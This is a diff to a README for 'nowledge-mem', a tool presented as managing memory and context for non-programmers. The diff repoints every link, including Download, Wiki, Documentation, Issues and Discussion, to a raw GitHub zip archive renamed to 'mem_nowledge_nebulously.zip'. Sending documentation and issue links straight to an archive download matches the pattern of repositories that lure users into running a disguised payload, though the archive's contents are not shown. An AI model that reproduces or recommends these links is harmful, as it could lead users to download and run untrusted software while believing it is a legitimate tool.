@@ -4,11 +4,11 @@
 
 Welcome to nowledge-mem! This application helps you manage your memory and context efficiently. It's designed for quick setup and ease of use, even if you aren’t familiar with programming.
 
-[![Download nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip%20nowledge--mem-v1.0-blue)](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip)
+[![Download nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip%20nowledge--mem-v1.0-blue)](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip)
 
 ## 📥 Download & Install
 
-To download nowledge-mem, visit this page: [Download Nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip). 
+To download nowledge-mem, visit this page: [Download Nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip). 
 
 1. Open the link.
 2. You will see a list of versions available for download.
@@ -50,7 +50,7 @@ This simple flow allows you to stay organized and focused.
 
 ## 📚 Additional Resources
 
-For further guidance, please visit our [Wiki](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip). Here, you will find:
+For further guidance, please visit our [Wiki](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip). Here, you will find:
 
 - **FAQs:** Answers to common questions.
 - **Troubleshooting:** Solutions for common issues.
@@ -58,13 +58,13 @@ For further guidance, please visit our [Wiki](https://raw.githubusercontent.com/
 
 ## 🌐 Community Support
 
-Join our community! Share your experience and connect with other users on our [Discussion Page](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip). We encourage feedback and suggestions to make nowledge-mem even better.
+Join our community! Share your experience and connect with other users on our [Discussion Page](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip). We encourage feedback and suggestions to make nowledge-mem even better.
 
 ## 🔗 Useful Links
 
-- [Download Nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip)
-- [Issues](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/nowledge-mem_v3.2.zip)
+- [Download Nowledge-mem](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip)
+- [Documentation](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip)
+- [Issues](https://raw.githubusercontent.com/Reneeviolent774/nowledge-mem/main/refs/nowledge_mem_exchange/mem_nowledge_nebulously.zip)
 
 Feel free to explore these links for more information and support.
 
